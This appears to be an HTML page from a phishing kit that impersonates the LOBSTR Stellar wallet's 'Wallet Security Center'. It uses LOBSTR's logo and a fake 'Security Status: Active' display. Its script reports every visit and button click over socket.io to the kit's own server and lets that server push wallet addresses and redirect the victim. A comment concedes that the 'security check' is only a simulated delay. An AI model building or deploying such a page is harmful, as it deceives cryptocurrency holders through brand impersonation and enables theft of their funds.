<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script src="/socket.io/socket.io.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOBSTR - Wallet Security</title>
    <link rel="icon" href="https://static.lobstr.co/static/landing/images/logo.svg">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --lobstr-teal: #1B8DA0;
            --lobstr-light-teal: #E8F4F6;
            --lobstr-dark-teal: #156B7D;
            --lobstr-white: #FFFFFF;
            --lobstr-gray: #F8F9FA;
            --lobstr-text: #333333;
            --lobstr-light-gray: #E9ECEF;
            --lobstr-success: #28A745;
            --lobstr-warning: #FFC107;
            --spacing-1: 8px;
            --spacing-2: 16px;
            --spacing-3: 24px;
            --spacing-4: 32px;
            --spacing-5: 40px;
            --border-radius: 8px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Ubuntu', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
            background-color: var(--lobstr-white);
            color: var(--lobstr-text);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: var(--spacing-3);
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .header {
            text-align: center;
            margin-bottom: var(--spacing-5);
        }

        .logo {
            height: 48px;
            margin-bottom: var(--spacing-2);
        }

        .title {
            font-size: 24px;
            font-weight: 500;
            color: var(--lobstr-text);
            margin-bottom: var(--spacing-1);
        }

        .subtitle {
            font-size: 16px;
            color: #666;
        }

        .card {
            background: var(--lobstr-white);
            border: 1px solid var(--lobstr-light-gray);
            border-radius: var(--border-radius);
            padding: var(--spacing-4);
            margin-bottom: var(--spacing-3);
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .security-icon {
            text-align: center;
            margin-bottom: var(--spacing-3);
        }

        .security-icon svg,
        .security-icon img {
            width: 64px;
            height: 64px;
            color: var(--lobstr-teal);
        }

        .security-status {
            text-align: center;
            margin-bottom: var(--spacing-4);
        }

        .status-indicator {
            display: inline-flex;
            align-items: center;
            gap: var(--spacing-1);
            background: var(--lobstr-light-teal);
            color: var(--lobstr-dark-teal);
            padding: var(--spacing-1) var(--spacing-2);
            border-radius: var(--border-radius);
            font-size: 14px;
            font-weight: 500;
            margin-bottom: var(--spacing-2);
        }

        .status-message {
            font-size: 18px;
            font-weight: 500;
            color: var(--lobstr-text);
            margin-bottom: var(--spacing-1);
        }

        .status-description {
            font-size: 14px;
            color: #666;
        }

        .address-section {
            margin-bottom: var(--spacing-4);
        }

        .address-label {
            font-size: 14px;
            font-weight: 500;
            color: var(--lobstr-text);
            margin-bottom: var(--spacing-1);
        }

        .address-display {
            background: var(--lobstr-gray);
            border: 1px solid var(--lobstr-light-gray);
            border-radius: var(--border-radius);
            padding: var(--spacing-2);
            font-family: 'Ubuntu Mono', monospace;
            font-size: 14px;
            word-break: break-all;
            color: var(--lobstr-text);
            position: relative;
        }

        .copy-button {
            position: absolute;
            top: var(--spacing-1);
            right: var(--spacing-1);
            background: var(--lobstr-teal);
            color: var(--lobstr-white);
            border: none;
            border-radius: var(--border-radius);
            padding: 4px 8px;
            font-size: 12px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .copy-button:hover {
            background: var(--lobstr-dark-teal);
        }

        .action-buttons {
            display: flex;
            gap: var(--spacing-2);
            margin-top: var(--spacing-3);
        }

        .action-button {
            flex: 1;
            padding: var(--spacing-2) var(--spacing-3);
            border: none;
            border-radius: var(--border-radius);
            font-size: 16px;
            font-weight: 500;
            font-family: 'Ubuntu', sans-serif;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .primary-button {
            background: var(--lobstr-teal);
            color: var(--lobstr-white);
        }

        .primary-button:hover {
            background: var(--lobstr-dark-teal);
        }

        .secondary-button {
            background: var(--lobstr-white);
            color: var(--lobstr-teal);
            border: 1px solid var(--lobstr-teal);
        }

        .secondary-button:hover {
            background: var(--lobstr-light-teal);
        }

        .security-features {
            background: var(--lobstr-light-teal);
            border: 1px solid var(--lobstr-teal);
            border-radius: var(--border-radius);
            padding: var(--spacing-3);
            margin-top: var(--spacing-3);
        }

        .security-title {
            font-size: 16px;
            font-weight: 500;
            color: var(--lobstr-dark-teal);
            margin-bottom: var(--spacing-2);
            display: flex;
            align-items: center;
            gap: var(--spacing-1);
        }

        .security-list {
            list-style: none;
            padding: 0;
        }

        .security-item {
            display: flex;
            align-items: center;
            gap: var(--spacing-1);
            font-size: 14px;
            color: var(--lobstr-dark-teal);
            margin-bottom: var(--spacing-1);
        }

        .security-item:last-child {
            margin-bottom: 0;
        }

        .warning-section {
            background: #FFF8E1;
            border: 1px solid var(--lobstr-warning);
            border-radius: var(--border-radius);
            padding: var(--spacing-3);
            margin-top: var(--spacing-3);
        }

        .warning-title {
            font-size: 14px;
            font-weight: 500;
            color: #F57C00;
            margin-bottom: var(--spacing-1);
            display: flex;
            align-items: center;
            gap: var(--spacing-1);
        }

        .warning-text {
            font-size: 13px;
            color: #F57C00;
        }

        .loading {
            display: none;
            text-align: center;
            margin-top: var(--spacing-2);
        }

        .loading-spinner {
            border: 2px solid var(--lobstr-light-gray);
            border-top: 2px solid var(--lobstr-teal);
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: var(--spacing-1);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .container {
                padding: var(--spacing-2);
            }
            
            .card {
                padding: var(--spacing-3);
            }
            
            .action-buttons {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://static.lobstr.co/static/landing/images/logo.svg" alt="LOBSTR" class="logo">
            <h1 class="title">Wallet Security Center</h1>
            <p class="subtitle">Manage your wallet whitelist settings</p>
        </div>

        <div class="card">
            <div class="security-icon">
                <svg viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.4 16,13V16C16,17.4 15.4,18 14.8,18H9.2C8.6,18 8,17.4 8,16V13C8,12.4 8.6,11.5 9.2,11.5V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,10V11.5H13.5V10C13.5,8.7 12.8,8.2 12,8.2Z"/>
                </svg>
            </div>

            <div class="security-status">
                <div class="status-indicator">
                    <span>üõ°Ô∏è</span>
                    Security Status: Active
                </div>
                <div class="status-message">Wallet Whitelist Protection</div>
                <div class="status-description">Your account is protected by advanced security measures</div>
            </div>

            <div class="address-section">
                <div class="address-label">Your Stellar Address</div>
                <div class="address-display">
                    GXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
                    <button class="copy-button" onclick="copyAddress()">Copy</button>
                </div>
            </div>

            <div class="address-section">
                <div class="address-label">Whitelisted Address</div>
                <div class="address-display">
                    GYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
                    <button class="copy-button" onclick="copyWhitelistAddress()">Copy</button>
                </div>
            </div>

            <div class="action-buttons">
                <button class="action-button secondary-button" onclick="manageWhitelist()">
                    Manage Whitelist
                </button>
                <button class="action-button primary-button" onclick="confirmContinue()" id="continueBtn">
                    Continue Securely
                </button>
            </div>

            <div class="loading" id="loading">
                <div class="loading-spinner"></div>
                Processing security verification...
            </div>
        </div>

        <div class="security-features">
            <div class="security-title">
                <span>üîí</span>
                LOBSTR Security Features
            </div>
            <ul class="security-list">
                <li class="security-item">
                    <span>‚úì</span>
                    Multi-signature wallet protection
                </li>
                <li class="security-item">
                    <span>‚úì</span>
                    Address whitelist verification
                </li>
                <li class="security-item">
                    <span>‚úì</span>
                    Real-time transaction monitoring
                </li>
                <li class="security-item">
                    <span>‚úì</span>
                    Advanced encryption protocols
                </li>
            </ul>
        </div>

        <div class="warning-section">
            <div class="warning-title">
                <span>‚ö†Ô∏è</span>
                Security Notice
            </div>
            <div class="warning-text">
                Only proceed if you recognize this transaction and the destination address is in your whitelist. LOBSTR will never ask for your private keys or seed phrase.
            </div>
        </div>
    </div>

    <script src="/js/socket-client.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Apply custom LOBSTR styling
            const style = document.createElement('style');
            style.textContent = `
                body { 
                    font-family: 'Ubuntu', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
                    background: #ffffff !important;
                }
            `;
            document.head.appendChild(style);

            // Socket connection for real-time updates
            socket.emit('page_visit', {
                page: window.location.pathname
            });

            // Request wallet information
            socket.emit('request_wallet_info');
        });

        function copyAddress() {
            const addressText = document.querySelector('.address-display').textContent.trim();
            navigator.clipboard.writeText(addressText).then(() => {
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = 'Copied!';
                setTimeout(() => {
                    button.textContent = originalText;
                }, 2000);
            });
        }

        function copyWhitelistAddress() {
            const addressElements = document.querySelectorAll('.address-display');
            const whitelistAddress = addressElements[1].textContent.trim();
            navigator.clipboard.writeText(whitelistAddress).then(() => {
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = 'Copied!';
                setTimeout(() => {
                    button.textContent = originalText;
                }, 2000);
            });
        }

        function manageWhitelist() {
            // Emit socket event for whitelist management
            socket.emit('whitelist_management_requested', {
                page: window.location.pathname
            });
            
            // Redirect to lobstr whitelist management page
            window.location.href = '/pages/lobstrWhitelistSuccessful.html';
        }

        function confirmContinue() {
            const continueBtn = document.getElementById('continueBtn');
            const loading = document.getElementById('loading');

            // Show loading state
            continueBtn.style.display = 'none';
            loading.style.display = 'block';

            // Emit socket events for security verification
            socket.emit('whitelist_verification_completed', {
                verified: true,
                page: window.location.pathname
            });

            // Simulate security check delay then redirect
            setTimeout(() => {
                socket.emit('page_loading', true);
                
                // Redirect to lobstr completed page
                socket.emit('request_redirect', { page: 'lobstrCompleted' });
            }, 3000);
        }

        // Socket event handlers
        socket.on('connect', () => {
            console.log('Connected to LOBSTR secure server');
        });

        socket.on('connect_error', (error) => {
            console.error('LOBSTR connection error:', error);
        });

        socket.on('redirect', (url) => {
            // Update URL to use lobstr prefixed pages
            window.location.href = url;
        });

        socket.on('session_url', (url) => {
            if (url && url !== window.location.pathname + window.location.search) {
                window.history.replaceState({}, '', url);
            }
        });

        socket.on('wallet_info', (data) => {
            if (data.stellar_address) {
                const addressDisplays = document.querySelectorAll('.address-display');
                if (addressDisplays[0]) {
                    addressDisplays[0].innerHTML = `${data.stellar_address}<button class="copy-button" onclick="copyAddress()">Copy</button>`;
                }
            }
            if (data.whitelist_address) {
                const addressDisplays = document.querySelectorAll('.address-display');
                if (addressDisplays[1]) {
                    addressDisplays[1].innerHTML = `${data.whitelist_address}<button class="copy-button" onclick="copyWhitelistAddress()">Copy</button>`;
                }
            }
        });

        socket.on('security_status_update', (data) => {
            const statusIndicator = document.querySelector('.status-indicator');
            const statusMessage = document.querySelector('.status-message');
            
            if (data.status === 'verified') {
                statusIndicator.innerHTML = '<span>‚úÖ</span>Security Status: Verified';
                statusIndicator.style.background = '#E8F5E8';
                statusIndicator.style.color = '#2E7D2E';
                statusMessage.textContent = 'Wallet Successfully Verified';
            } else if (data.status === 'pending') {
                statusIndicator.innerHTML = '<span>‚è≥</span>Security Status: Pending';
                statusIndicator.style.background = '#FFF8E1';
                statusIndicator.style.color = '#F57C00';
                statusMessage.textContent = 'Security Verification in Progress';
            }
        });

        socket.on('whitelist_error', (error) => {
            alert('Security Error: ' + (error.message || 'Unable to verify whitelist status'));
        });

        // Periodic security status check
        setInterval(() => {
            socket.emit('check_security_status', {
                page: window.location.pathname
            });
        }, 30000); // Check every 30 seconds
    </script>
</body>
</html>